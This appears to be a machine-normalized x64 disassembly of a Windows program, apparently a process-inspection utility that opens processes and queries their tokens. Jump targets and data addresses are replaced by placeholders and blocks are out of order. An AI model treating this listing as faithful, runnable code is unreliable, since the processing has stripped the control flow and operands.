mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
jmp r-xdata
add rbx 0x28
cmp rbx [ r12 + 0x8 ]
mov rcx 0x7ffffffffffffffe
jne r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_14003ad04
xor r8d r8d
call sub_140003120
jmp r-xdata
or edx 0x4
mov [ rbp - 0x11 ] 0x7
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] r13w
mov r8d 0x7
mov [ rbp - 0x69 ] r8
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
mov rsi [ rbx + 0x10 ]
cmp rsi 0xffffffffffffffff
cmova rsi r15
lea rax [ rsp + 0x28 ]
cmp rax rbx
jne r-xdata
jmp r-xdata
sub_140025e30
mov rax rsp
push r13
push r14
push r15
sub rsp 0xa0
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
mov r15d 0x20
mov ecx r15d
call sub_14003ac60
mov rbp rax
test rax rax
je r-xdata
xor ebp ebp
mov [ rax ] 0x0
mov [ rax + 0x8 ] 0x0
mov [ rax + 0x10 ] 0x0
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x68 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea r14 [ rw-data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rbx [ rbp ]
cmp rbx [ rbp + 0x8 ]
je r-xdata
xor edx edx
mov rcx rbp
call sub_14000c0b0
test al al
je r-xdata
test rbp rbp
je r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
mov r13d 0x9
mov al 0x1
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
mov rcx rbp
call sub_14000d510
mov rcx rbp
call j_sub_14003ad04
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
xor ecx ecx
jmp r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
xor ecx ecx
jmp r-xdata
mov rdx [ r12 + 0x8 ]
call [ r12 ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r15w
mov edx 0x5
lea rcx [ rsp + 0x38 ]
call sub_140039e70
mov r12 rax
mov edx [ rbx + 0x20 ]
mov rcx rdi
call sub_140008400
mov rcx rax
movzx edx r13w
call sub_14000fe50
mov rdi rax
test rax rax
jne r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r12
xor ecx ecx
jmp r-xdata
mov rdx [ r12 + 0x8 ]
call [ r12 ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r15w
mov edx 0x5
lea rcx [ rsp + 0x48 ]
call sub_140039e70
mov r13 rax
mov edx [ rbx + 0x1c ]
mov rcx rdi
call sub_140008400
mov rcx rax
mov edx 0x9
call sub_14000fe50
mov r12 rax
test rax rax
jne r-xdata
mov rax [ r12 ]
movsxd rcx [ rax + 0x4 ]
add rcx r12
test edi edi
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
mov rdx [ r13 + 0x8 ]
call [ r13 ]
mov r11 [ r12 ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + r12 + 0x58 ] r15w
mov edx [ rbx + 0x24 ]
mov rcx r12
call sub_140026d50
mov rcx rax
mov r13d 0x9
movzx edx r13w
call sub_14000fe50
mov rcx rax
lea rdx [ rbx + 0x30 ]
call sub_14000ae70
mov r12 rax
lea edx [ r13 + 0x1 ]
mov rcx rax
call sub_1400085e0
xor edi edi
mov rcx [ r12 ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
add rbx 0x58
cmp rbx [ rbp + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0x5
lea rcx [ rsp + 0x58 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx r14
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + r14 + 0x58 ] r15w
mov edx 0x5
lea rcx [ rsp + 0x28 ]
call sub_140039e70
mov r12 rax
mov edx [ rbx + 0x8 ]
mov rcx r14
call sub_140008400
mov rcx rax
movzx edx r13w
call sub_14000fe50
mov rdi rax
test rax rax
jne r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_140026150
mov rax rsp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x160
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x158 ] rax
mov rbx rcx
xor r12d r12d
mov [ rsp + 0x20 ] r12d
mov rax [ rcx ]
mov rdx [ rcx + 0x8 ]
cmp rax rdx
je r-xdata
mov ecx 0x20
call sub_14003ac60
mov rbp rax
test rax rax
je r-xdata
sub rdx rax
mov rax 0x6666666666666667
imul rdx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
ja r-xdata
mov rbp r12
mov [ rax ] r12
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] r12
jmp r-xdata
lea rcx [ rsp + 0x30 ]
call sub_140003c20
nop
mov rdx [ rbx ]
lea rcx [ rsp + 0x40 ]
call sub_14000ae70
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_14001da90
nop
lea rcx [ rsp + 0xc8 ]
call sub_140003cd0
lea r11 [ r--data ]
mov [ rsp + 0xc8 ] r11
lea rcx [ rsp + 0xc8 ]
call sub_140037d08
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x130 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x148 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rbx [ rbp ]
cmp rbx [ rbp + 0x8 ]
je r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rbp
call sub_14000c590
test al al
je r-xdata
test rbp rbp
je r-xdata
mov rcx [ rsp + 0x130 ]
call j_sub_14003ad04
mov r14d 0x9
lea r13d [ r14 - 0x5 ]
nop [ rax + rax ] eax
mov al 0x1
mov rcx [ rsp + 0x158 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x160 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rcx [ rbp ]
test rcx rcx
je r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove edi r13d
mov [ rbp ] r12
mov [ rbp + 0x8 ] r12
mov [ rbp + 0x10 ] r12
mov rcx rbp
call j_sub_14003ad04
mov rdx [ rbp + 0x8 ]
call sub_14000de60
mov rcx [ rbp ]
call j_sub_14003ad04
sub rbx 0xffffffffffffff80
cmp rbx [ rbp + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rdx [ rbx + 0x18 ]
lea rcx [ rw-data ]
call sub_140023170
mov rcx rax
movzx edx r14w
call sub_14000fe50
mov rcx rax
mov edx [ rbx + 0x20 ]
call sub_140008400
mov rcx rax
call sub_140027010
mov rcx rax
lea rdx [ rbx + 0x30 ]
call sub_14000ae70
mov rcx rax
movzx edx r14w
call sub_14000fe50
mov rcx rax
lea rdx [ rbx + 0x58 ]
call sub_14000ae70
mov rsi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov edi r12d
mov rcx [ rsi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx r13d
sub_140026400
mov rax rsp
push rbp
push r12
push r13
lea rbp [ rax - 0x28 ]
sub rsp 0x110
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x8 ] rax
mov rbx rcx
mov [ rbp - 0x30 ] 0x7
xor r12d r12d
mov [ rbp - 0x38 ] r12
mov [ rbp - 0x48 ] r12w
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] r12
mov [ rbp - 0x70 ] r12w
mov r10 [ rcx ]
mov rcx [ rcx + 0x8 ]
sub rcx r10
mov rdi 0x6666666666666667
mov rax rdi
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
or r13 0xffffffffffffffff
dec rdx
je r-xdata
mov rdx r10
lea rcx [ rbp - 0x48 ]
dec rdx
jne r-xdata
mov rbx r12
mov [ rax ] r12
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] r12
jmp r-xdata
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x60 ] r12w
xor dil dil
mov ecx 0x20
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
mov r9 r13
xor r8d r8d
mov rdx r10
lea rcx [ rbp - 0x48 ]
call sub_140001dd0
mov r11 [ rbx ]
mov rcx [ rbx + 0x8 ]
sub rcx r11
mov rax rdi
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
ja r-xdata
test rbx rbx
je r-xdata
mov r8 [ rbx ]
mov rcx [ rbx + 0x8 ]
sub rcx r8
mov rax 0x2e8ba2e8ba2e8ba3
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
sete dil
test dil dil
je r-xdata
lea rdx [ rbp - 0x48 ]
mov rcx rbx
call sub_14000c0b0
test al al
je r-xdata
lea rdx [ r11 + 0x28 ]
lea rcx [ rbp - 0x70 ]
jmp r-xdata
lea rcx [ r--data ]
call sub_140037948
test dil dil
je r-xdata
mov rcx rbx
call sub_14000d510
mov rcx rbx
call j_sub_14003ad04
mov eax [ r8 ]
mov [ rsp + 0x30 ] eax
mov eax [ r8 + 0x4 ]
mov [ rsp + 0x34 ] eax
mov eax [ r8 + 0x8 ]
mov [ rsp + 0x38 ] eax
mov rax [ r8 + 0x10 ]
mov [ rsp + 0x40 ] rax
mov eax [ r8 + 0x18 ]
mov [ rsp + 0x48 ] eax
mov eax [ r8 + 0x1c ]
mov [ rsp + 0x4c ] eax
mov eax [ r8 + 0x20 ]
mov [ rsp + 0x50 ] eax
mov eax [ r8 + 0x24 ]
mov [ rsp + 0x54 ] eax
mov eax [ r8 + 0x28 ]
mov [ rsp + 0x58 ] eax
lea rdx [ r8 + 0x30 ]
mov r9 r13
xor r8d r8d
lea rcx [ rsp + 0x60 ]
call sub_140001dd0
mov r9 r13
xor r8d r8d
call sub_140001dd0
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x20 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
mov r8d [ rsp + 0x38 ]
xor edx edx
mov ecx 0x410
call [ OpenProcess@IAT ]
mov rsi rax
test rax rax
je r-xdata
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x20 ]
call j_sub_14003ad04
nop
cmp [ rbp - 0x60 ] 0x0
je r-xdata
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x60 ] r12w
cmp [ rbp - 0x58 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_14003ad04
mov rdi [ rbp - 0x38 ]
cmp rdi 0xffffffffffffffff
cmova rdi r13
mov rdx rdi
lea rcx [ rbp - 0x70 ]
call sub_140002230
test al al
je r-xdata
lea rdx [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rdx [ rbp - 0x70 ]
cmp [ rdx ] 0x2a
jne r-xdata
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] r12
mov [ rbp - 0x70 ] r12w
cmp [ rbp - 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x70 ]
call j_sub_14003ad04
mov ecx 0x80
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
lea rdx [ rbp - 0x48 ]
cmp [ rbp - 0x30 ] 0x8
cmovae rdx [ rbp - 0x48 ]
lea rcx [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rcx [ rbp - 0x70 ]
lea rbx [ rdi + rdi ]
mov r8 rbx
call sub_14003a8c0
mov [ rbp - 0x60 ] rdi
lea rax [ rbp - 0x70 ]
cmp [ rbp - 0x58 ] 0x8
cmovae rax [ rbp - 0x70 ]
mov [ rax + rbx ] r12w
mov ecx 0x20
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x8 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x110 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp - 0x48 ]
call j_sub_14003ad04
mov rdi r12
mov [ rax + 0x48 ] 0x7
mov [ rax + 0x40 ] r12
mov [ rax + 0x30 ] r12w
mov [ rax + 0x70 ] 0x7
mov [ rax + 0x68 ] r12
mov [ rax + 0x58 ] r12w
jmp r-xdata
mov rdi r12
mov [ rax ] r12
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] r12
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x20 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
mov rdx rsi
mov rcx rdi
call sub_140026ac0
jmp r-xdata
lea r8 [ rsp + 0x38 ]
lea rdx [ rbp - 0x70 ]
mov rcx rdi
call sub_14000c3b0
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x20 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
lea rdx [ rsp + 0x38 ]
mov rcx rdi
call sub_14000c590
test al al
je r-xdata
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x20 ]
call j_sub_14003ad04
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x20 ]
call j_sub_14003ad04
nop [ rax ] eax
mov rcx rsi
call [ CloseHandle@IAT ]
jmp r-xdata
mov edx 0x1
mov rcx rdi
call sub_14000e440
mov rcx rdi
call sub_14000c550
jmp r-xdata
mov rdx rsi
mov rcx rbx
call sub_140026ac0
sub rbx 0xffffffffffffff80
cmp rbx [ rdi + 0x8 ]
jne r-xdata
jmp r-xdata
sub_1400268d0
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x90
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
mov ebx edx
mov r12 rcx
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov edx [ r12 ]
call sub_140008400
mov rcx rax
call sub_140007970
test ebx ebx
je r-xdata
xor esi esi
mov ebp esi
mov [ rsp + 0x30 ] rsi
xor dil dil
mov r8d [ r12 ]
xor edx edx
mov ecx 0x400
call [ OpenProcess@IAT ]
mov rbx rax
test rax rax
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov edx ebx
call sub_140008400
mov rcx rax
call sub_140007970
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x50 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rcx [ rsp + 0x50 ]
call j_sub_14003ad04
lea r8 [ rsp + 0x38 ]
mov edx 0x20008
mov rcx rax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call [ CloseHandle@IAT ]
test dil dil
je r-xdata
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x20 ] rax
lea r9d [ rsi + 0x38 ]
lea r8 [ rsp + 0x50 ]
lea edx [ rsi + 0xa ]
mov rcx [ rsp + 0x38 ]
call [ GetTokenInformation@IAT ]
test eax eax
setne dil
mov eax esi
test dil dil
cmovne rax [ rsp + 0x58 ]
mov [ rsp + 0x30 ] rax
mov rcx [ rsp + 0x38 ]
call [ CloseHandle@IAT ]
mov ebp [ rsp + 0x34 ]
mov esi [ rsp + 0x30 ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
mov edx ebp
call sub_140026d50
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_140004ed0
mov rcx rax
mov edx esi
call sub_140008400
mov rcx rax
call sub_140007970
jmp r-xdata
sub_140026ac0
push r12
sub rsp 0x30
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x50 ] rdi
mov [ rsp + 0x58 ] r13
mov rsi rdx
lea rdx [ rcx + 0x30 ]
mov rdi rcx
lea r13 [ rw-data ]
mov [ rsp + 0x20 ] r15
mov rcx r13
call sub_14000ae70
lea rdx [ r--data ]
mov rcx rax
call sub_14000ac10
lea rdx [ rdi + 0x58 ]
mov rcx rax
call sub_14000ae70
mov rcx rax
call sub_140007970
mov rbx [ rdi + 0x18 ]
mov r15d 0x20
mov ecx r15d
call sub_14003ac60
mov r12 rax
test rax rax
je r-xdata
xor r12d r12d
mov [ rax ] 0x0
mov [ rax + 0x8 ] 0x0
mov [ rax + 0x10 ] 0x0
jmp r-xdata
mov r15 [ rsp + 0x20 ]
mov r13 [ rsp + 0x58 ]
mov rdi [ rsp + 0x50 ]
mov rsi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
test r12 r12
je r-xdata
mov rdi [ r12 ]
cmp rdi [ r12 + 0x8 ]
je r-xdata
mov r8 rsi
mov rdx r12
mov rcx rbx
call sub_14000cb80
test al al
je r-xdata
add rsp 0x30
pop r12
retn
mov rcx r12
call sub_140026f80
mov rcx r12
call j_sub_14003ad04
mov [ rsp + 0x28 ] r14
mov r14d 0x4
mov rbx rdi
mov rbx [ rdi ]
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove ebx r14d
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rdx rbx
mov rcx rax
call sub_140004ed0
mov edx 0xa
mov rcx rax
mov rsi rax
call sub_1400085e0
mov rcx [ rsi ]
xor ebx ebx
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
mov rbx [ rdi + 0x28 ]
cmp rbx [ rdi + 0x30 ]
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
add rdi 0x48
cmp rdi [ r12 + 0x8 ]
jne r-xdata
nop
xor r8d r8d
call sub_140003120
or edx r14d
cmp [ rdi + 0x18 ] 0x10
jb r-xdata
mov r14 [ rsp + 0x28 ]
cmp [ rbx + 0x30 ] 0x10
jb r-xdata
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
movzx edx si
mov rcx rax
call sub_14001c6b0
jmp r-xdata
lea rdx [ rbx + 0x18 ]
mov rdx [ rbx + 0x18 ]
jmp r-xdata
mov edx 0xa
mov rcx r13
call sub_1400085e0
mov rax [ rw-data ]
xor esi esi
movsxd rcx [ rax + 0x4 ]
test [ rcx + r13 + 0x10 ] 0x6
jne r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r13
test esi esi
je r-xdata
mov rcx [ rcx + r13 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov rax [ rw-data ]
cmove esi r14d
mov rcx r13
call sub_140004ed0
add rbx 0x40
cmp rbx [ rdi + 0x30 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx esi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rdx [ rbx ]
mov rcx rax
call sub_140023170
lea rdx [ r--data ]
mov rcx rax
call sub_14000ac10
mov rdx [ rbx + 0x8 ]
mov rcx rax
call sub_140023170
movzx edx r15w
mov rcx rax
call sub_14000fe50
movzx esi [ rbx + 0x10 ]
test si si
je r-xdata
xor r8d r8d
call sub_140003120
or edx r14d
sub_140026d50
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14d edx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_140003240
nop
mov rcx rax
call sub_14000b0c0
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_1400103c0
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x38 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_140026f30
sub rsp 0x28
mov r10 [ rcx ]
mov r8 [ rcx + 0x8 ]
mov r9 rdx
sub r8 r10
mov rax 0x6666666666666667
imul r8
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx r9
ja r-xdata
lea rax [ r9 + r9 * 4 ]
lea rax [ r10 + rax * 8 ]
add rsp 0x28
retn
lea rcx [ r--data ]
call sub_140037948
sub_140026f80
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbx [ rcx ]
xor ebp ebp
mov rdi rcx
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rsi
mov rsi [ rcx + 0x8 ]
cmp rbx rsi
je r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov rsi [ rsp + 0x30 ]
nop [ rax + rax ] ax
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bpl
add rbx 0x48
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
lea rcx [ rbx + 0x28 ]
call sub_14000d6c0
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
sub_140027010
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rdi rcx
xor ebx ebx
mov [ rsp + 0x88 ] ebx
mov r15 rcx
mov [ rsp + 0x28 ] rcx
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
mov rcx [ rdx + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rdi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rdi ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rdi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
je r-xdata
mov rcx [ rcx + rdi + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rdi + 0x28 ] 0x0
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rdi
lea rdx [ rsp + 0x98 ]
call sub_140003240
nop
mov rcx rax
call sub_140004d80
mov r14 rax
mov r12 [ rsp + 0x98 ]
test r12 r12
je r-xdata
call sub_1400103c0
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rsi [ rcx + rdi + 0x28 ]
cmp rsi 0x1
jg r-xdata
xor edx edx
lea rcx [ rsp + 0x90 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ r15 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r15 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r15
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
dec rsi
xor esi esi
jmp r-xdata
